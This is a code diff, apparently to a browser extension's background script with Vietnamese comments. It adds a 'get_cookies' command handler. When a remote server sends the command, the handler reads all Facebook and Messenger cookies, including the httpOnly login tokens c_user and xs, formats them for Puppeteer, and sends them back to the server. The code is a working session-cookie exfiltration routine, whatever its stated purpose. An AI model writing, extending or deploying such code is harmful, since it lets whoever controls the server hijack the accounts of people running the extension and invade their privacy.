@@ -135,6 +135,79 @@ async function handleServerMessage(msg) {
     case 'ping':
       sendToServer({ type: 'pong' });
       break;
+
+    case 'get_cookies': {
+      // Lấy cookies từ tab Facebook/Messenger đang mở
+      try {
+        const fbTabs = await chrome.tabs.query({
+          url: [
+            '*://*.facebook.com/*',
+            '*://*.messenger.com/*',
+          ]
+        });
+
+        if (fbTabs.length === 0) {
+          sendToServer({
+            type: 'cookies_result',
+            success: false,
+            error: 'Không tìm thấy tab Facebook/Messenger nào đang mở. Vui lòng mở facebook.com hoặc messenger.com trước.'
+          });
+          return;
+        }
+
+        // Lấy cookies của domain facebook.com
+        const cookies = await chrome.cookies.getAll({ domain: '.facebook.com' });
+        const messengerCookies = await chrome.cookies.getAll({ domain: '.messenger.com' });
+
+        // Gộp lại, loại bỏ trùng lặp
+        const allCookies = [...cookies];
+        for (const mc of messengerCookies) {
+          if (!allCookies.find(c => c.name === mc.name)) {
+            allCookies.push(mc);
+          }
+        }
+
+        // Kiểm tra có cookie đăng nhập không
+        const hasAuth = allCookies.some(c => c.name === 'c_user' || c.name === 'xs');
+        if (!allCookies.length || !hasAuth) {
+          sendToServer({
+            type: 'cookies_result',
+            success: false,
+            error: 'Không tìm thấy cookie xác thực. Vui lòng đăng nhập Facebook trước khi lấy cookies.'
+          });
+          return;
+        }
+
+        // Format cookies theo cấu trúc Puppeteer cần
+        const formattedCookies = allCookies.map(c => ({
+          name: c.name,
+          value: c.value,
+          domain: c.domain,
+          path: c.path,
+          secure: c.secure,
+          httpOnly: c.httpOnly,
+          sameSite: c.sameSite === 'no_restriction' ? 'None' :
+                    c.sameSite === 'lax' ? 'Lax' :
+                    c.sameSite === 'strict' ? 'Strict' : 'None',
+          expirationDate: c.expirationDate,
+        }));
+
+        sendToServer({
+          type: 'cookies_result',
+          success: true,
+          cookies: formattedCookies,
+          tabUrl: fbTabs[0].url,
+          cookieCount: formattedCookies.length
+        });
+      } catch (e) {
+        sendToServer({
+          type: 'cookies_result',
+          success: false,
+          error: 'Lỗi khi lấy cookies: ' + e.message
+        });
+      }
+      break;
+    }
   }
 }
 
